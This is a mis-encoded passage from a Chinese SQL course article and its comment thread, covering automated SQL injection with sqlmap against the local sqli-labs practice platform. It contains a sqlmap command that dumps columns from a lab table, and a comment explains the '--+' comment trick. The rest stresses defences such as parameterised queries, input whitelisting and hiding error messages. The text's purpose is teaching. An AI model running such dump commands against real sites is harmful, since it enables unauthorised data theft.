alt=\"\"></p><h3>æŸ¥è¯¢herosæ•°æ®è¡¨ä¸­çš„è‹±é›„ä¿¡æ¯</h3><p>å½“æˆ‘ä»¬äº†è§£äº†æ•°æ®è¡¨ä¸­çš„å­—æ®µä¹‹åï¼Œå°±å¯ä»¥å¯¹æŒ‡å®šå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œä½¿ç”¨<code>-C</code>å‚æ•°è¿›è¡ŒæŒ‡å®šã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢herosæ•°æ®è¡¨ä¸­çš„<code>id</code>ã€<code>name</code>å’Œ<code>hp_max</code>å­—æ®µçš„å–å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸é‡‡ç”¨å¤šçº¿ç¨‹çš„æ–¹å¼ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D wucai -T heros -C id,name,hp_max --dump\n</code></pre><p><img src=\"https://static001.geekbang.org/resource/image/ce/33/ced56f2e12f6c1afccadac6be231a533.png?wh=750*1100\" alt=\"\"><br>\nå®Œæ•´çš„ç»“æœä¸€å…±åŒ…æ‹¬69ä¸ªè‹±é›„ä¿¡æ¯éƒ½æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œè¿™é‡Œæˆ‘åªæˆªå–äº†éƒ¨åˆ†çš„è‹±é›„ç»“æœã€‚</p><h2>æ€»ç»“</h2><p>åœ¨ä»Šå¤©çš„å†…å®¹ä¸­ï¼Œæˆ‘ä½¿ç”¨äº†sqli-labsæ³¨å…¥å¹³å°ä½œä¸ºå®éªŒæ•°æ®ï¼Œä½¿ç”¨äº†SQLmapå·¥å…·è‡ªåŠ¨å®ŒæˆSQLæ³¨å…¥ã€‚SQLæ³¨å…¥çš„æ–¹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬ä»Šå¤©è®²è§£çš„åªæ˜¯å…¶ä¸­ä¸€ä¸ªæ–¹å¼ã€‚ä½ å¦‚æœå¯¹SQLæ³¨å…¥æ„Ÿå…´è¶£ï¼Œä¹Ÿå¯ä»¥å¯¹sqli-labsä¸­å…¶ä»–ä¾‹å­è¿›è¡Œå­¦ä¹ ï¼Œäº†è§£æ›´å¤šSQLæ³¨å…¥çš„æ–¹æ³•ã€‚</p><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæœ€ä¸»è¦çš„æ˜¯ç†è§£SQLæ³¨å…¥çš„åŸç†ã€‚åœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç”¨æˆ·æäº¤çš„å†…å®¹è¿›è¡ŒéªŒè¯ï¼Œä»¥é˜²æ­¢SQLæ³¨å…¥ã€‚å½“ç„¶å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éƒ½åœ¨ä½¿ç”¨ç¼–ç¨‹æ¡†æ¶ï¼Œè¿™äº›æ¡†æ¶å·²ç»æå¤§åœ°é™ä½äº†SQLæ³¨å…¥çš„é£é™©ï¼Œä½†æ˜¯åªè¦æœ‰SQLæ‹¼æ¥çš„åœ°æ–¹ï¼Œè¿™ç§é£é™©å°±å¯èƒ½å­˜åœ¨ã€‚</p><p>æ€»ä¹‹ï¼Œä»£ç è§„èŒƒæ€§å¯¹äºWebå®‰å…¨æ¥è¯´éå¸¸é‡è¦ï¼Œå°½é‡ä¸è¦é‡‡ç”¨ç›´æ¥æ‹¼æ¥çš„æ–¹å¼è¿›è¡ŒæŸ¥è¯¢ã€‚åŒæ—¶åœ¨Webä¸Šçº¿ä¹‹åï¼Œè¿˜éœ€è¦å°†ç”Ÿäº§ç¯å¢ƒä¸­çš„é”™è¯¯æç¤ºä¿¡æ¯å…³é—­ï¼Œä»¥å‡å°‘è¢«SQLæ³¨å…¥çš„é£é™©ã€‚æ­¤å¤–æˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨ç¬¬ä¸‰æ–¹çš„å·¥å…·ï¼Œæ¯”å¦‚SQLmapæ¥å¯¹Webåº”ç”¨è¿›è¡Œæ£€æµ‹ï¼Œä»¥å¢å¼ºWebå®‰å…¨æ€§ã€‚</p><p><img src=\"\" alt=\"\"></p><p>ä½ ä¸å¦¨æ€è€ƒä¸‹ï¼Œä¸ºä»€ä¹ˆå¼€å‘äººå‘˜çš„ä»£ç è§„èŒƒå¯¹äºWebå®‰å…¨æ¥è¯´éå¸¸é‡è¦ï¼Ÿä»¥åŠéƒ½æœ‰å“ªäº›æ–¹å¼å¯ä»¥é˜²æ­¢SQLæ³¨å…¥å‘¢ï¼Ÿ</p><p>æ¬¢è¿ä½ åœ¨è¯„è®ºåŒºå†™ä¸‹ä½ çš„æ€è€ƒï¼Œä¹Ÿæ¬¢è¿æŠŠè¿™ç¯‡æ–‡ç« åˆ†äº«ç»™ä½ çš„æœ‹å‹æˆ–è€…åŒäº‹ï¼Œä¸€èµ·äº¤æµä¸€ä¸‹ã€‚</p>","neighbors":{"left":{"article_title":"36ä¸¨æ•°æ®åº“æ²¡æœ‰å¤‡ä»½ï¼Œæ²¡æœ‰ä½¿ç”¨Binlogçš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•æ¢å¤æ•°æ®ï¼Ÿ","id":136546},"right":{"article_title":"38ä¸¨å¦‚ä½•åœ¨Excelä¸­ä½¿ç”¨SQLè¯­è¨€ï¼Ÿ","id":128758}},"comments":[{"had_liked":false,"id":134451,"user_name":"å¢¨ç¦¾","can_delete":false,"product_type":"c1","uid":1216590,"ip_address":"","ucode":"81BA44231AABE8","user_header":"https://static001.geekbang.org/account/avatar/00/12/90/4e/efaea936.jpg","comment_is_top":false,"comment_ctime":1568848262,"is_pvip":false,"replies":[{"id":"63870","content":"å¯¹çš„","user_name":"ä½œè€…å›å¤","user_name_real":"cy","uid":"1306094","ctime":1577601389,"ip_address":"","comment_id":134451,"utype":1}],"discussion_count":3,"race_medal":0,"score":"65993357702","product_id":100029501,"comment_content":"<br>ä¸è§„èŒƒçš„ä»£ç ï¼Œæ¯”å¦‚æ‹¼æ¥sql å´æ²¡æœ‰è¿›è¡Œå‚æ•°åŒ–éªŒè¯ï¼Œæˆ–è€…åœ¨å‰ç«¯éªŒè¯å®Œå‚æ•°å°±ä»¥ä¸ºæ˜¯å®‰å…¨çš„è¾“å…¥ï¼Œè¿™äº›éƒ½å¾ˆå®¹æ˜“è¢«ç»•è¿‡ï¼Œå¯¼è‡´sqlæ³¨å…¥ã€‚<br><br>é˜²æ³¨å…¥çš„æ–¹æ³•ï¼š<br>1 å‚æ•°åŒ–éªŒè¯ã€‚ä¸åŒçš„è¯­è¨€éƒ½åº”è¯¥å°è£…äº†è¿™ç§æ–¹æ³•ï¼Œæ¯”å¦‚è¯´c#,javaçš„sqlparameter .<br>2 å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ã€‚ä¸¥æ ¼çš„ç™½åå•è¿›è¡Œå‚æ•°è¿‡æ»¤ã€‚","like_count":15,"discussions":[{"author":{"id":1306094,"avatar":"https://static001.geekbang.org/account/avatar/00/13/ed/ee/c4779b67.jpg","nickname":"cy","note":"","ucode":"50D653399A31F6","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":467754,"discussion_content":"å¯¹çš„","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577601389,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1350608,"avatar":"https://static001.geekbang.org/account/avatar/00/14/9b/d0/86aee34c.jpg","nickname":"åˆ˜å‡¯","note":"","ucode":"EFDC932CAE61A6","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":210854,"discussion_content":"å‚æ•°è¯æŸ¥è¯¢","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1584783456,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1394726,"avatar":"https://static001.geekbang.org/account/avatar/00/15/48/26/93fd21d5.jpg","nickname":"ä¹¦ç—•","note":"","ucode":"8367371EF89D61","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":46019,"discussion_content":"ä½¿ç”¨æŸ¥è¯¢æ¨¡æ¿","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1573111808,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":153635,"user_name":"zhxxmu","can_delete":false,"product_type":"c1","uid":1058889,"ip_address":"","ucode":"4F74621F2C50D5","user_header":"https://static001.geekbang.org/account/avatar/00/10/28/49/27219a0f.jpg","comment_is_top":false,"comment_ctime":1574292162,"is_pvip":false,"replies":[{"id":"62659","content":"å¯¹ è¿™æ˜¯ä¸€ç§é¿å…çš„æ–¹å¼","user_name":"ä½œè€…å›å¤","user_name_real":"cy","uid":"1306094","ctime":1577081822,"ip_address":"","comment_id":153635,"utype":1}],"discussion_count":1,"race_medal":0,"score":"14459194050","product_id":100029501,"comment_content":"åœ¨åç«¯ç¨‹åºä¸­é‡‡ç”¨å‚æ•°åŒ–æŸ¥è¯¢æ–¹å¼è¿›è¡ŒæŸ¥è¯¢","like_count":3,"discussions":[{"author":{"id":1306094,"avatar":"https://static001.geekbang.org/account/avatar/00/13/ed/ee/c4779b67.jpg","nickname":"cy","note":"","ucode":"50D653399A31F6","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":475235,"discussion_content":"å¯¹ è¿™æ˜¯ä¸€ç§é¿å…çš„æ–¹å¼","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577081822,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":134143,"user_name":"è’™å¼€å¼º","can_delete":false,"product_type":"c1","uid":1317706,"ip_address":"","ucode":"61B3183781B9F7","user_header":"https://static001.geekbang.org/account/avatar/00/14/1b/4a/f9df2d06.jpg","comment_is_top":false,"comment_ctime":1568767106,"is_pvip":false,"replies":[{"id":"62725","content":"å—¯ è¿™ç¯‡æ–‡ç« è®²çš„æ˜¯ä¸€äº›åŸºç¡€çš„æ“ä½œï¼Œç›®å‰SQLæ³¨å…¥çš„æ”»é˜²å·²ç»è¶Šæ¥è¶Šé«˜é˜¶çš„","user_name":"ä½œè€…å›å¤","user_name_real":"cy","uid":"1306094","ctime":1577087100,"ip_address":"","comment_id":134143,"utype":1}],"discussion_count":2,"race_medal":0,"score":"14453668994","product_id":100029501,"comment_content":"è€å¸ˆï¼Œä½ å¥½ï¼Œç›®å‰å¾ˆå°‘ä½¿ç”¨getæ–¹å¼æäº¤äº†ï¼Œå·®ä¸å¤šç”¨postï¼Œè€Œä¸”è¾“å…¥å‚æ•°éƒ½ä¼šæ ¡éªŒçš„","like_count":3,"discussions":[{"author":{"id":1306094,"avatar":"https://static001.geekbang.org/account/avatar/00/13/ed/ee/c4779b67.jpg","nickname":"cy","note":"","ucode":"50D653399A31F6","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":467628,"discussion_content":"å—¯ è¿™ç¯‡æ–‡ç« è®²çš„æ˜¯ä¸€äº›åŸºç¡€çš„æ“ä½œï¼Œç›®å‰SQLæ³¨å…¥çš„æ”»é˜²å·²ç»è¶Šæ¥è¶Šé«˜é˜¶çš„","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1577087100,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1211987,"avatar":"https://static001.geekbang.org/account/avatar/00/12/7e/53/c29c2fc9.jpg","nickname":"sdjdd","note":"","ucode":"512F2338DFF793","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":15048,"discussion_content":"ä½ å¥½ï¼ŒGET è¯·æ±‚ä¸æ˜¯ç”¨æ¥æäº¤æ•°æ®çš„ï¼Œè€Œä¸”æŸ¥è¯¢å­—ç¬¦ä¸²æ˜¯ URL çš„ä¸€éƒ¨åˆ†ï¼Œä¸ç®¡è¯·æ±‚æ–¹æ³•æ˜¯ GET è¿˜æ˜¯ POST ï¼ŒæœåŠ¡ç«¯éƒ½å¯ä»¥è·å–åˆ°ã€‚","likes_number":5,"is_delete":false,"is_hidden":false,"ctime":1568799658,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":220739,"user_name":"éª‘è¡Œçš„æŒæŸœJ","can_delete":false,"product_type":"c1","uid":1474214,"ip_address":"","ucode":"3163102651C653","user_header":"https://static001.geekbang.org/account/avatar/00/16/7e/a6/4e331ef4.jpg","comment_is_top":false,"comment_ctime":1590316695,"is_pvip":false,"discussion_count":1,"race_medal":0,"score":"5885283991","product_id":100029501,"comment_content":"https:&#47;&#47;blog.csdn.net&#47;weixin_41013322&#47;article&#47;details&#47;106290783 åˆè®°å½•äº†ä¸€ä¸‹åœ¨è¿™ç¯‡SQLæ³¨å…¥è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„çš„åœ°æ–¹ å¸Œæœ›å¯¹å„ä½æœ‰å¸®åŠ©ğŸ˜€","like_count":1,"discussions":[{"author":{"id":2962599,"avatar":"https://static001.geekbang.org/account/avatar/00/2d/34/a7/52c4ea60.jpg","nickname":"å¹´å°‘æŒ½æ»‘ç¨½ä¸–æ— åŒ","note":"","ucode":"793DCBDE25A07B","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":588648,"discussion_content":"cy","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1663933239,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":"å››å·"},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":217605,"user_name":"åˆ˜æ¡¢","can_delete":false,"product_type":"c1","uid":1482815,"ip_address":"","ucode":"3BFAB1C9772EB4","user_header":"https://static001.geekbang.org/account/avatar/00/16/a0/3f/06b690ba.jpg","comment_is_top":false,"comment_ctime":1589545444,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"5884512740","product_id":100029501,"comment_content":"å­¦åˆ°äº†","like_count":1},{"had_liked":false,"id":169908,"user_name":"Geek_1c165d","can_delete":false,"product_type":"c1","uid":1584176,"ip_address":"","ucode":"3E1B70DCF3DF13","user_header":"https://wx.qlogo.cn/mmopen/vi_32/aianFlNnvpUaPUbYG9EjVbibgOgOCJYqgiapCbsbIhWHJG8BBm4fzo1ALNI8vqsL4mrGB9vWPWyUCct5yLp0neQDg/132","comment_is_top":false,"comment_ctime":1578470761,"is_pvip":false,"discussion_count":1,"race_medal":0,"score":"5873438057","product_id":100029501,"comment_content":"è¯·é—®è€å¸ˆurlåé¢çš„--+ä½œç”¨æ˜¯å•¥ï¼Ÿ","like_count":1,"discussions":[{"author":{"id":1798260,"avatar":"https://static001.geekbang.org/account/avatar/00/1b/70/74/06742258.jpg","nickname":"demnox","note":"","ucode":"C3D8A08ED74ED1","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":130970,"discussion_content":"urlä¸­åŠ å·+ä»£è¡¨ç©ºæ ¼ï¼Œ--+åœ¨æ‰§è¡Œçš„sqlä¸­å°±å˜æˆäº†â€œ--ç©ºæ ¼â€ï¼ŒMySQLä¸­ --ç©ºæ ¼ ä»£è¡¨æ³¨é‡Šç¬¦ï¼Œåé¢çš„sqlè¯­å¥å°±è¢«æ³¨é‡Šæ‰äº†","likes_number":6,"is_delete":false,"is_hidden":false,"ctime":1578815872,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":134419,"user_name":"è®¸ç«¥ç«¥","can_delete":false,"product_type":"c1","uid":1003005,"ip_address":"","ucode":"4B799C0C6BC678","user_header":"https://static001.geekbang.org/account/avatar/00/0f/4d/fd/0aa0e39f.jpg","comment_is_top":false,"comment_ctime":1568820966,"is_pvip":false,"replies":[{"id":"53359","content":"åŠ æ²¹","user_name":"ä½œè€…å›å¤","user_name_real":"cy","uid":"1306094","ctime":1570427969,"ip_address":"","comment_id":134419,"utype":1}],"discussion_count":1,"race_medal":0,"score":"5863788262","product_id":100029501,"comment_content":"æ¶¨çŸ¥è¯†äº†ï¼Œè°¢è°¢è€å¸ˆçš„åˆ†äº«ã€‚","like_count":1,"discussions":[{"author":{"id":1306094,"avatar":"https://static001.geekbang.org/account/avatar/00/13/ed/ee/c4779b67.jpg","nickname":"cy","note":"","ucode":"50D653399A31F6","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":467736,"discussion_content":"åŠ æ²¹","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1570427969,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":358190,"user_name":"Geek_186f56","can_delete":false,"product_type":"c1","uid":2775228,"ip_address":"ä¸Šæµ·","ucode":"369673F1D82081","user_header":"","comment_is_top":false,"comment_ctime":1664016692,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1664016692","product_id":100029501,"comment_content":"æ¶¨çŸ¥è¯†äº†","like_count":0},{"had_liked":false,"id":323915,"user_name":"ğŸ‘½","can_delete":false,"product_type":"c1","uid":1274117,"ip_address":"","ucode":"D313AF941B412D","user_header":"https://static001.geekbang.org/account/avatar/00/13/71/05/db554eba.jpg","comment_is_top":false,"comment_ctime":1638230305,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1638230305","product_id":100029501,"comment_content":"å‚æ•°åŒ–æŸ¥è¯¢ï¼Œï¼Ÿ ä»£æ›¿æ‰éœ€è¦æ‰§è¡Œçš„sqlå˜é‡","like_count":0},{"had_liked":false,"id":245637,"user_name":"Frank","can_delete":false,"product_type":"c1","uid":1111985,"ip_address":"","ucode":"9DADD72C193296","user_header":"https://static001.geekbang.org/account/avatar/00/10/f7/b1/982ea185.jpg","comment_is_top":false,"comment_ctime":1599014271,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"1599014271","product_id":100029501,"comment_content":"å‰æ®µç”¨æˆ·è¾“å…¥çš„æ‰€æœ‰æ•°æ®éƒ½è¦åšéªŒè¯ã€‚","like_count":0},{"had_liked":false,"id":178662,"user_name":"ğŸ˜³","can_delete":false,"product_type":"c1","uid":1452857,"ip_address":"","ucode":"9AFB87EF308539","user_header":"https://static001.geekbang.org/account/avatar/00/16/2b/39/19041d78.jpg","comment_is_top":false,"comment_ctime":1581775248,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1581775248","product_id":100029501,"comment_content":"1:å‚æ•°è¯sqlè¯­å¥<br>2:å­˜å‚¨è¿‡ç¨‹<br>3:æ­£åˆ™è¡¨è¾¾å¼","like_count":0},{"had_liked":false,"id":177798,"user_name":"é«˜æ³½æ—","can_delete":false,"product_type":"c1","uid":1764725,"ip_address":"","ucode":"DE54EBFFF11265","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/AGicQgKibwja1SxkQ7oXQE8hYH7yCpiaicNHw3qZRuNB81aVDOQm9P1zd5F75Jbtv66G15D6ZjbbqfnoETR4321Zdw/132","comment_is_top":false,"comment_ctime":1581502444,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1581502444","product_id":100029501,"comment_content":"æ­£éœ€è¦ï¼","like_count":0}]}